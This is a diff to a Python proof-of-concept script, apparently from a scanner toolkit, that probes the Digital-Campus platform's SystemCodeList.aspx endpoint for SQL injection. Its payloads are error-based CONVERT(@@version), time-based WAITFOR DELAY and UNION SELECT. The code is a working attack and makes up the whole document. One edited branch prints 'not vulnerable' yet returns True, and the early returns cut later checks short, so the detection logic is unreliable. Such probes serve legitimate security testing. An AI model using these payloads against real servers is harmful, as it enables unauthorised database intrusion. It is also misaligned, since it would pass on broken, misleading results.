@@ -32,20 +32,23 @@ class digital_campus_systemcodelist_sqli_BaseVerify:
 
             except:
                 cprint("[-] "+__file__+"====>连接超时", "cyan")
+                return False
 
         if r"DayNum" in reqlst[0] and r"DayNum" in reqlst[1]:
             if len(reqlst[0]) != len(reqlst[1]):
-                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "green")
 
         payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27%20AnD%201=CoNvErt(Int,@@version)--&paramRturnValue=1"
         vulnurl = self.url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.status_code == 500 and r"Microsoft SQL Server" in req.text:
-                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                cprint("[-]不存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                return True
 
         except:
             cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return False
 
         payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27;WaItFor%20DeLaY%20%270:0:6%27--&paramRturnValue=1"
         vulnurl = self.url + payload
@@ -53,10 +56,12 @@ class digital_campus_systemcodelist_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
-                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "green")
+                return True
 
         except:
             cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return False
 
         payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=1%27%20WaItFor%20DeLaY%20%270:0:6%27--&paramRturnValue=1"
         vulnurl = self.url + payload
@@ -64,17 +69,21 @@ class digital_campus_systemcodelist_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
-                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "green")
+                return True
+
 
         except:
             cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return False
 
         payload = "/Code/Common/SystemCodeList.aspx?Method=GetCodeTepyBy&paramFileName=1&paramValue=-1%27%20UnIoN%20AlL%20SeLeCt%20CHAR(113)+CHAR(%2781dc9bdb52d04dc20036dbd8313ed055%27)+CHAR(113)+CHAR(118)+CHAR(113)+(CASE%20WHEN%20(CONCAT(NULL,NULL)=CONCAT(NULL,NULL))%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END)+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)--&paramRturnValue=1"
         vulnurl = self.url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "green")
+                return True
 
         except:
             cprint("[-] "+__file__+"====>连接超时", "cyan")
@@ -85,10 +94,15 @@ class digital_campus_systemcodelist_sqli_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
-                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                cprint("[+]存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "green")
+                return True
 
         except:
             cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return False
+
+        cprint("[-]不存在Digital-Campus数字校园平台SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+        return False
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
